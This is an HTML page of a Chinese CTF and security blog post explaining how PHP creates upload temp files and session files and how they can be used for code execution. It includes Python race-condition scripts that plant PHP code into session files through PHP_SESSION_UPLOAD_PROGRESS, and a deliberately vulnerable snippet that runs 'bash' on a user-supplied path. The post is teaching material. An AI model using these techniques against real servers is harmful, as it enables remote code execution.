@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>PHP临时文件生成分析及利用 - the0n3</title>
+        <meta name="description" content="昨天在测试沫沫的靶机Phptmp时，一个无字母数字RCE漏洞的web入口，第一版很容易的通过取反的方案实现了rce打穿了，给作者反馈后，第二版上ban掉了异或取反等无字母数字的利用方案，引导选手往作者预期的“临时文件”利用方向去做。测试完后，有些意犹未尽，水篇文章来分析一下PHP临时文件的生成机制和利用方式。 PHP场…">
+    <link rel="canonical" href="https://the0n3.top/posts/php-tmp-file/">
+    <!-- Open Graph -->
+    <meta property="og:title" content="PHP临时文件生成分析及利用">
+    <meta property="og:description" content="昨天在测试沫沫的靶机Phptmp时，一个无字母数字RCE漏洞的web入口，第一版很容易的通过取反的方案实现了rce打穿了，给作者反馈后，第二版上ban掉了异或取反等无字母数字的利用方案，引导选手往作者预期的“临时文件”利用方向去做。测试完后，有些意犹未尽，水篇文章来分析一下PHP临时文件的生成机制和利用方式。 PHP场…">
+    <meta property="og:url" content="https://the0n3.top/posts/php-tmp-file/">
+    <meta property="og:type" content="article">
+    <meta property="og:site_name" content="the0n3">
+    <meta property="og:locale" content="zh_CN">
+        <meta property="og:image" content="https://the0n3.top/images/php-tmp-file/1.png">
+        <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="PHP临时文件生成分析及利用">
+    <meta name="twitter:description" content="昨天在测试沫沫的靶机Phptmp时，一个无字母数字RCE漏洞的web入口，第一版很容易的通过取反的方案实现了rce打穿了，给作者反馈后，第二版上ban掉了异或取反等无字母数字的利用方案，引导选手往作者预期的“临时文件”利用方向去做。测试完后，有些意犹未尽，水篇文章来分析一下PHP临时文件的生成机制和利用方式。 PHP场…">
+        <meta name="twitter:image" content="https://the0n3.top/images/php-tmp-file/1.png">
+        <script>
+        (function () {
+            try {
+                var key = 'theme';
+                var saved = localStorage.getItem(key);
+                var theme = (saved === 'dark' || saved === 'light') ? saved : 'light';
+                document.documentElement.setAttribute('data-theme', theme);
+                document.documentElement.style.colorScheme = theme;
+            } catch (e) {
+                document.documentElement.setAttribute('data-theme', 'light');
+                document.documentElement.style.colorScheme = 'light';
+            }
+        })();
+    </script>
+    <!-- 评论系统预连接：giscus 由前端按访客主题动态注入，提前建连可抵消注入延迟 -->
+    <link rel="preconnect" href="https://giscus.app" crossorigin>
+    <!-- 使用 GitHub Markdown 样式 -->
+    <link rel="stylesheet" href="/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/assets/css/site.css">
+    <!-- 功能样式（自动扫描 assets/features/ 目录） -->
+        <link rel="stylesheet" href="/assets/features/code-fold/style.css">
+        <link rel="stylesheet" href="/assets/features/image-enhance/style.css">
+        <link rel="stylesheet" href="/assets/features/nav-menu/style.css">
+        <link rel="stylesheet" href="/assets/features/random-recommend/style.css">
+        <link rel="stylesheet" href="/assets/features/reading-progress/style.css">
+        <link rel="stylesheet" href="/assets/features/tax-accordion/style.css">
+        <link rel="stylesheet" href="/assets/css/nav-reveal.css">
+    <link rel="stylesheet" href="/assets/css/search.css">
+    <!-- 代码高亮样式 -->
+    <link rel="stylesheet" href="/assets/prism/prism.css">
+</head>
+<body>
+    <div class="reading-progress" aria-hidden="true">
+        <div class="reading-progress__bar"></div>
+    </div>
+    <header>
+        <nav>
+            <div class="nav-right">
+                <details class="nav-menu">
+                    <summary class="nav-toggle" aria-label="打开菜单"><span aria-hidden="true">☰</span></summary>
+                </details>
+                <div class="nav-links">
+                                <a href="/">首页</a>
+                                <a href="/archives/">归档</a>
+                                <a href="/categories/">分类</a>
+                                <a href="/tags/">标签</a>
+                                <a href="/friends/">友链</a>
+                                <a href="/about/">关于</a>
+                                <a href="https://www.travellings.cn/go.html">开往</a>
+                                                </div>
+                <button
+                    id="searchTrigger"
+                    class="search-trigger"
+                    type="button"
+                    aria-label="打开搜索"
+                    aria-haspopup="dialog"
+                    aria-controls="searchModal"
+                    title="搜索（/）"
+                >
+                    <span class="search-trigger__label">搜索</span>
+                    <span class="search-trigger__hint">/</span>
+                </button>
+            </div>
+        </nav>
+    </header>
+                <div class="page-layout">
+            <main class="markdown-body">
+                
+<article class="post-content">
+    <h1>PHP临时文件生成分析及利用</h1>
+    <p>
+        <span class="meta">发布于: 2026-10-08 10:08</span>
+    </p>
+    <div class="post-body">
+        <p>昨天在测试沫沫的靶机Phptmp时，一个无字母数字RCE漏洞的web入口，第一版很容易的通过取反的方案实现了rce打穿了，给作者反馈后，第二版上ban掉了异或取反等无字母数字的利用方案，引导选手往作者预期的“临时文件”利用方向去做。测试完后，有些意犹未尽，水篇文章来分析一下PHP临时文件的生成机制和利用方式。</p>
+<p>PHP场景下常利用的临时文件包括：文件上传生成的临时文件、PHP的登录或上传留下的session临时文件。</p>
+<h2>文件上传生成临时文件</h2>
+<p>临时文件的产生原因：PHP 在接收任何 multipart/form-data 请求时，会在脚本执行前由 SAPI 层自动解析请求体，把文件部分写入临时目录upload_tmp_dir（默认 /tmp），并填充好 $_FILES 和 $_POST。这个过程与脚本是否真的处理上传无关——只要请求格式是 multipart，PHP 就会先落盘再交控制权，Web 服务器（Apache/Nginx）只负责转发原始请求体。因此，即使你直接伪造一个 multipart 请求、脚本里完全没有上传逻辑，PHP 依然会在 /tmp 留下临时文件，注意这个临时文件只能短暂存在。</p>
+<p>临时文件存放位置：在 php.ini 中配置 upload_tmp_dir 为空，PHP 会默认把临时文件存放在 /tmp 目录。可能受 systemd 的 PrivateTmp隔离机制，systemd 会为每个服务进程挂载一个独立的、私有的 /tmp，出现不同用户看到的 /tmp 目录下内容不同的情况。</p>
+<p><img src="/images/php-tmp-file/1.png" alt="php upload_tmp_dir配置为空" decoding="async" width="1856" height="888"></p>
+<p><img src="/images/php-tmp-file/2.png" alt="systemd PrivateTmp隔离机制" decoding="async" loading="lazy" width="1385" height="758"></p>
+<p>为什么存放在 /tmp 目录，不是存在内存里？如果把临时文件都存放在内存里，用户并发上传大文件，可能会耗尽内存。</p>
+<p>临时文件的存活窗口等于 PHP 请求的生命周期：从 SAPI 解析完 multipart、把文件写入 /tmp 开始，到脚本执行完毕、request shutdown 清理为止。窗口由实际处理该请求的脚本决定，与上传目标页面绑定。如果目标脚本里有 sleep(1) 这类耗时操作，窗口就会被拉长到约 1 秒以上，为竞争条件利用创造时间差。Amazing，有新思路了。</p>
+<p>演示一个简单的PHP服务端：</p>
+<pre><code class="language-php">&lt;?php
+# c.php
+echo 111;
+sleep(3);</code></pre>
+<p>伪造文件上传脚本：</p>
+<pre><code class="language-python">import io
+import requests
+import threading
+import time
+
+url = 'http://192.168.56.154/c.php'
+
+def write():
+    while True:
+        fileBytes = io.BytesIO(b'222')
+        try:
+            requests.post(url,files={'file': ('1.jpg', fileBytes, 'image/jpeg')},timeout=5,)
+        except Exception:
+            pass
+if __name__ == '__main__':
+    for _ in range(30):
+        threading.Thread(target=write, daemon=True).start()
+
+    while True:
+        time.sleep(0.05)</code></pre>
+<p>实验成功展示，随着python脚本不断伪造文件上传请求，服务端/tmp目录下产生很多php的临时文件，使用随机文件名临时存放了我们上传的文件，在上传脚本停下后，临时文件短暂存在并消失。</p>
+<p><img src="/images/php-tmp-file/4.png" alt="python脚本伪造文件上传" decoding="async" loading="lazy" width="1298" height="720"></p>
+<p>这个临时文件名生成算法很有意思，重点介绍下。我所了解到的生成算法有两种，这里先讲<strong>新版的生成算法</strong>。靶机使用了PHP 8.4.24，下面以8.4.24为例。临时文件生成逻辑源码：<a href="https://github.com/php/php-src/blob/php-8.4.24/main/php_open_temporary_file.c">https://github.com/php/php-src/blob/php-8.4.24/main/php_open_temporary_file.c</a></p>
+<p>临时文件名由前缀（pfx）+ 随机后缀组成，核心目标是让文件名不可预测且足够随机，避免被恶意猜测或碰撞。</p>
+<p>在其他场景函数内部调用创建临时文件函数时，临时文件名生成算法流程：</p>
+<ul>
+<li>确定前缀。传入前缀参数<code>pfx</code>，若为 NULL，会默认设"tmp."。</li>
+<li>生成 64 位随机数。</li>
+<li>用 base32 编码随机数。使用自定义的base32编码表<code>0123456789abcdefghijklmnopqrstuv</code>，把 64 位随机数编码为 13 个字符（log(2⁶⁴)/log(32) ≈ 12.8，向上取 13）。</li>
+<li>从随机数中获取13位随机数。循环 13 次，每次用 random % 32 从字母表取一个字符写入，然后 random /= 32 右移一位（等价于整除 32），直到写满 13 个字符。</li>
+<li>解析目录为绝对路径。取当前工作目录，把传入目录解析成规范化绝对路径。</li>
+<li>拼接 mkstemp 模板。Unix 下拼成 &lt;目录&gt;/&lt;随机前缀&gt;XXXXXX，XXXXXX 是 mkstemp 要求的 6 位占位符。Windows这里暂不讨论，感兴趣自行阅读分析。</li>
+<li>替换 mkstemp 模板。调用系统提供的 mkstemp 函数，把模板末尾 6 个 X 原地替换为随机字符，并创建文件。无 mkstemp 的系统退化为 mktemp 生成名再 open。</li>
+</ul>
+<p>可以定位到这次讨论的/tmp目录下文件上传生成的临时文件逻辑<a href="https://github.com/php/php-src/blob/php-8.4.24/main/rfc1867.c#L1006">文件上传创建临时文件</a></p>
+<p><img src="/images/php-tmp-file/5.png" alt="调用创建临时文件函数" decoding="async" loading="lazy" width="1920" height="1001"></p>
+<p><img src="/images/php-tmp-file/6.png" alt="文件上传调用创建临时文件函数时传入php前缀" decoding="async" loading="lazy" width="1769" height="922"></p>
+<p><strong>旧版临时文件生成算法</strong>，以PHP 5.4.34为例，生成逻辑简单很多。<a href="https://github.com/php/php-src/blob/php-5.4.34/main/php_open_temporary_file.c#L97">https://github.com/php/php-src/blob/php-5.4.34/main/php_open_temporary_file.c#L97</a></p>
+<p>构造文件名模板spprintf(&amp;opened_path, 0, "%s%s%sXXXXXX", new_state.cwd, trailing_slash, pfx)，生成的文件名格式是&lt;目录&gt;/&lt;前缀&gt;XXXXXX，pfx同样如果为空设置为<code>tmp.</code>，末尾拼接6位XXXXXX占位符，再使用mkstemp()生成随机字符并提供模板的占位符，以 0600 权限创建并打开文件。如果mkstemp不存在，使用mktemp()生成随机字符并替换模板的占位符。这里讲的是Linux下的生成算法，Windows下有所不同，这里不做讨论。</p>
+<h2>session会话文件</h2>
+<p>Session 文件（会话文件）是指在计算机、Web 开发或特定软件中，用来记录用户在某次“会话（Session）”期间的状态、变量或操作信息的文件。在Web开发中，HTTP 协议本身是“无状态”的（即服务器不会记住你上一次发了什么请求）。Web 服务器（如 PHP）会将用户的登录状态、购物车数据、临时变量等保存在服务器端的 Session 文件中，服务端返回响应给客户端设置一个 Session ID（通常通过 Cookie 传递），客户端在后续请求中携带这个 Session ID，服务器就能识别用户的身份并恢复之前的状态。</p>
+<p>Session会话文件在服务端的保存路径一般是由 PHP 的 session.save_path 配置项决定的，如果为空，则默认使用系统的临时目录/tmp。每个 Session 文件的命名通常是 sess_加上一个唯一的 Session ID，例如 sess_abc123xyz。</p>
+<p>该靶机默认配置的Session保存路径为：/var/lib/php/sessions/，1440秒后过期，但不会被GC删除，在debian下通过定时任务每30分钟自动删除。</p>
+<p><img src="/images/php-tmp-file/7.png" alt="session默认配置" decoding="async" loading="lazy" width="1920" height="847"></p>
+<p>PHP常见的临时文件保存目录：</p>
+<pre><code class="language-plaintext">/tmp/
+/tmp/sessions/
+/var/lib/php/
+/var/lib/php/sessions/</code></pre>
+<p>举个例子：</p>
+<pre><code class="language-php">&lt;?php
+session_start();
+
+if (isset($_GET['u'])) {
+    $_SESSION['user'] = $_GET['u'];
+} elseif (!isset($_SESSION['user'])) {
+    $_SESSION['user'] = 'guest';
+}
+
+echo "Hi, " . $_SESSION['user'];</code></pre>
+<p>使用第二次返回的cookie访问，在第三次没有带u参数访问时，仍然可以得到第二次身份验证的结果。</p>
+<p><img src="/images/php-tmp-file/8.png" alt="session状态验证" decoding="async" loading="lazy" width="1382" height="923"></p>
+<p><img src="/images/php-tmp-file/9.png" alt="session数据查看" decoding="async" loading="lazy" width="1426" height="477"></p>
+<p>上面演示里通过$_SESSION变量来控制session文件里每个变量的值，要求服务端脚本提供对应的功能，还是太吃操作了，那么有没有更<del>猖獗</del>友好一点的利用手法？有的兄弟。</p>
+<p>Session Upload Progress 最初是PHP为上传进度条设计的一个功能，在上传文件较大的情况下，PHP将进行流式上传，并将进度信息放在Session中，此时即使用户没有初始化Session，PHP也会自动初始化Session。</p>
+<p>PHP配置文件里默认开启了通过session状态文件记录文件上传进度的功能和自动清理session状态文件的功能，并且这个记录文件上传的sessionid和PHP_SESSION_UPLOAD_PROGRESS是我们可控的，sessionid可以让我们控制文件名，PHP_SESSION_UPLOAD_PROGRESS 这个变量的值可以让我们控制部分文件内容（上传进度）。</p>
+<p><img src="/images/php-tmp-file/10.png" alt="PHP上传进度记录配置默认值" decoding="async" loading="lazy" width="1515" height="371"></p>
+<p>演示一个简单的PHP服务端：</p>
+<pre><code class="language-php">&lt;?php
+echo 111;
+sleep(3);</code></pre>
+<p>python伪造文件上传请求的测试脚本：</p>
+<pre><code class="language-python">import io
+import requests
+import threading
+import time
+
+url = 'http://192.168.56.154/c.php'
+
+def write():
+    while True:
+        # 构造大文件内容，让上传持续一段时间
+        fileBytes = io.BytesIO(b'A' * (5 * 1024 * 1024))  # 5MB
+        files = {
+            'file': ('1.jpg', fileBytes, 'image/jpeg'),
+        }
+        data = {
+            # 这个字段名必须等于 session.upload_progress.name
+            'PHP_SESSION_UPLOAD_PROGRESS': '&lt;?php phpinfo();?&gt;',
+        }
+        cookies = {
+            # 控制sessionid，从而控制文件名
+            'PHPSESSID': 'test123',
+        }
+        try:
+            requests.post(url, files=files, data=data, cookies=cookies, timeout=10)
+        except Exception:
+            pass
+
+if __name__ == '__main__':
+    for _ in range(10):
+        threading.Thread(target=write, daemon=True).start()
+    while True:
+        time.sleep(0.05)</code></pre>
+<p>条件竞争拿到一个成功案例，文件内容如下：</p>
+<pre><code class="language-plaintext">upload_progress_&lt;?php phpinfo();?&gt;|a:5:{s:10:"start_time";i:1791449342;s:14:"content_length";i:5243173;s:15:"bytes_proce
+ssed";i:5244;s:4:"done";b:0;s:5:"files";a:1:{i:0;a:7:{s:10:"field_name";s:4:"file";s:4:"name";s:5:"1.jpg";s:8:"tmp_name"
+;N;s:5:"error";i:0;s:4:"done";b:0;s:10:"start_time";i:1791449342;s:15:"bytes_processed";i:5244;}}}</code></pre>
+<p><img src="/images/php-tmp-file/11.png" alt="PHP条件竞争获取文件上传进度文件" decoding="async" loading="lazy" width="1920" height="525"></p>
+<p>session 文件是"存储层"，progress.php 是"读取层"，前端 JS 是"展示层"。这个设计预期流程如下：</p>
+<pre><code class="language-plaintext">浏览器上传文件
+    ↓
+PHP 在解析 multipart 过程中，不断更新 $_SESSION['upload_progress_&lt;key&gt;']
+    ↓
+$_SESSION 被序列化写入 /var/lib/php/sessions/sess_&lt;id&gt; 
+    ↓
+前端 JS 轮询 progress.php
+    ↓
+progress.php 读 $_SESSION，取出 bytes_processed / content_length，JSON 返回
+    ↓
+前端计算百分比，更新进度条</code></pre>
+<p>可以通过合理设置 PHP_SESSION_UPLOAD_PROGRESS 的值，来控制 session 文件的内容。</p>
+<pre><code class="language-python">def write():
+    while True:
+        # 构造大文件内容，让上传持续一段时间
+        fileBytes = io.BytesIO(b'A' * (5 * 1024 * 1024))  # 5MB
+        files = {
+            'file': ('1.jpg', fileBytes, 'image/jpeg'),
+        }
+        data = {
+            # 这个字段名必须等于 session.upload_progress.name
+            'PHP_SESSION_UPLOAD_PROGRESS': '''
+&lt;?php phpinfo();?&gt;
+111
+222
+333
+''',</code></pre>
+<p><img src="/images/php-tmp-file/12.png" alt="控制session文件内容" decoding="async" loading="lazy" width="1920" height="779"></p>
+<h2>简单测试</h2>
+<p>给出一道简单的PHP题目</p>
+<pre><code class="language-php">&lt;?php
+highlight_file(__FILE__);
+
+$f = $_GET['f'] ?? '';
+if (file_exists($f)) {
+    system("bash $f");
+}</code></pre>
+<h2>优缺点总结</h2>
+<p>了解以上两种场景的临时文件利用方式后，可以总结出一些出优缺点了。</p>
+<p>文件上传生成临时文件的场景下，临时文件名长度固定为9位或22位，文件名不可控、不可预测，内容完全可控。<br>
+session临时文件场景下，临时文件名可控，会拼接固定前缀sess_，内容不完全可控。  </p>    </div>
+        <div class="post-meta-footer">
+                    <span class="post-meta-item">分类:
+                                    <span>PHP</span>
+                            </span>
+                    </div>
+    </article>
+
+<section class="post-recommend" data-featured-recommend hidden aria-labelledby="featuredRecommendTitle">
+    <h2 class="post-recommend__title" id="featuredRecommendTitle">精选推荐</h2>
+    <div class="post-recommend__slot" data-featured-recommend-slot></div>
+</section>
+
+
+<section class="post-comments" aria-label="Comments"
+    data-giscus
+    data-theme-mode="auto"
+    data-theme-light="light"
+    data-theme-dark="dark_dimmed"
+    data-repo="Apursuit/the0n3-blog"
+    data-repo-id="R_kgDORvPPbA"
+    data-category="Announcements"
+    data-category-id="DIC_kwDORvPPbM4C5KAt"
+    data-mapping="pathname"
+    data-strict="0"
+    data-reactions-enabled="1"
+    data-emit-metadata="0"
+    data-input-position="bottom"
+    data-lang="zh-CN">
+    <div class="giscus"></div>
+</section>
+
+            </main>
+                <aside class="post-toc" aria-label="Table of contents">
+        <div class="toc-title">目录</div>
+        <nav class="toc-list"></nav>
+    </aside>
+            </div>
+    
+    <!-- 搜索命令面板：
+         第一版先提供标题、日期、标签搜索，以及键盘导航和快捷键 -->
+    <div id="searchModal" class="search-modal" hidden>
+        <div class="search-modal__overlay" data-search-close></div>
+        <div class="search-modal__dialog" role="dialog" aria-modal="true" aria-labelledby="searchModalTitle">
+            <div class="search-modal__panel">
+                <div class="search-modal__header">
+                    <div class="search-modal__title-group">
+                        <div id="searchModalTitle" class="search-modal__title">搜索文章</div>
+                        <div class="search-modal__subtitle">输入标题、标签或关键词，按 Enter 打开结果</div>
+                    </div>
+                    <button
+                        id="searchClose"
+                        class="search-modal__close"
+                        type="button"
+                        aria-label="关闭搜索"
+                        title="关闭搜索"
+                    >
+                        ×
+                    </button>
+                </div>
+
+                <div class="search-modal__body">
+                    <label class="search-input-wrap" for="searchInput">
+                        <span class="search-input-wrap__icon" aria-hidden="true">⌕</span>
+                        <input
+                            id="searchInput"
+                            class="search-input"
+                            type="text"
+                            placeholder="搜索文章..."
+                            autocomplete="off"
+                            spellcheck="false"
+                        >
+                    </label>
+
+                    <div class="search-help">
+                        <span>/ 打开</span>
+                        <span>↑ ↓ 选择</span>
+                        <span>Enter 打开</span>
+                        <span>Esc 关闭</span>
+                    </div>
+
+                    <div id="searchState" class="search-state" aria-live="polite">输入关键词开始搜索</div>
+                    <div id="searchResults" class="search-results" role="listbox" aria-label="搜索结果"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <button id="backToTop" class="fab fab-top" type="button" aria-label="返回顶部" title="返回顶部">↑</button>
+    <button id="themeToggle" class="theme-toggle" type="button" aria-label="切换主题" title="切换主题"></button>
+    <script src="/assets/js/site.js"></script>
+    <!-- 功能脚本（自动扫描 assets/features/ 目录） -->
+        <script src="/assets/features/blog-stats/script.js"></script>
+        <script src="/assets/features/code-fold/script.js"></script>
+        <script src="/assets/features/giscus-theme/script.js"></script>
+        <script src="/assets/features/image-enhance/script.js"></script>
+        <script src="/assets/features/random-recommend/script.js"></script>
+        <script src="/assets/features/reading-progress/script.js"></script>
+        <script src="/assets/features/tax-accordion/script.js"></script>
+        <script src="/assets/js/navReveal.js"></script>
+    <!-- 启动代码高亮及行号显示 -->
+    <script src="/assets/prism/prism.js"></script>
+    <script src="/assets/prism/prism-line-number.js"></script>
+    <!-- 主题切换 -->
+    <script src="/assets/js/ThemeSwitch.js"></script>
+    <!-- 弹簧动画工具（搜索弹窗/灯箱进出场依赖） -->
+    <script src="/assets/js/spring.js"></script>
+    <!-- 搜索功能 -->
+    <script src="/assets/js/fuse.js"></script>
+    <script src="/assets/js/search.js"></script>
+</body>
+</html>
